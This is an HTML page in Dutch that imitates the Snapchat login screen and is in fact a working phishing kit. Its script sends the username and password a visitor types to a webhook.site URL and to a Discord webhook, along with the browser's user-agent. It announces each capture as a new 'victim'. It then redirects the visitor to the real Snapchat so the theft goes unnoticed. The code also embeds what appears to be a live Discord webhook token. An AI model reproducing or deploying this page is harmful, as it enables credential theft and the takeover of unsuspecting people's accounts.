<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #FFFC00;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
            width: 360px;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: #FFFC00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 40px;
        }
        .ghost { font-size: 50px; line-height: 80px; }
        h1 { color: #333; margin-bottom: 8px; font-size: 24px; }
        .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus { border-color: #FFFC00; }
        button {
            width: 100%;
            padding: 14px;
            background: #FFFC00;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            color: #333;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover { background: #f2e900; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
        .loader {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid #ddd;
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 12px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="ghost">👻</span>
        </div>
        <h1>Log in</h1>
        <p class="subtitle">Log in om Snapchat te gebruiken</p>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Gebruikersnaam of e-mail" required>
            <input type="password" id="password" name="password" placeholder="Wachtwoord" required>
            <button type="submit" id="submitBtn">Log in</button>
            <div class="loader" id="loader"></div>
        </form>
        <div class="footer">Nog geen account? <a href="#">Aanmelden</a></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var submitBtn = document.getElementById('submitBtn');
            var loader = document.getElementById('loader');
            
            // Toon loader
            submitBtn.style.display = 'none';
            loader.style.display = 'block';
            
            // 1. Stuur naar Webhook.site
            fetch('https://webhook.site/edc9ee44-326a-4cd4-9dc4-34ac54df77bd', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                })
            }).catch(function(err) {
                console.error('Webhook error:', err);
            });
            
            // 2. Stuur naar Discord
            fetch('https://discord.com/api/webhooks/1511700822323495054/zbkEUXFd0MBCjRVY22RzWI2cnTnNTKvzupE7Wh8TUhcLnZ1s8yQ_DnB1UIVv-wS5546Y', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: '@everyone **Nieuw Snapchat slachtoffer!**',
                    embeds: [{
                        title: 'Inloggegevens gevangen',
                        color: 0xfffc00,
                        fields: [
                            { name: 'Gebruikersnaam/E-mail', value: username || 'Onbekend', inline: true },
                            { name: 'Wachtwoord', value: password || 'Onbekend', inline: true },
                            { name: 'User-Agent', value: navigator.userAgent.length > 50 ? navigator.userAgent.substring(0, 50) + '...' : navigator.userAgent, inline: false },
                            { name: 'Tijdstip', value: new Date().toLocaleString('nl-NL'), inline: false }
                        ],
                        footer: { text: 'SnapPhish Alert • GitHub Pages' },
                        timestamp: new Date().toISOString()
                    }]
                })
            }).catch(function(err) {
                console.error('Discord error:', err);
            });
            
            // 3. Na 2 seconden doorsturen naar echte Snapchat
            setTimeout(function() {
                window.location.href = 'https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYdXJhbnhuaHBkAZ14D-ceAZ14DeB5AAAAAQ?ref=web_spotlight';
            }, 2000);
        });
    </script>
</body>
</html>
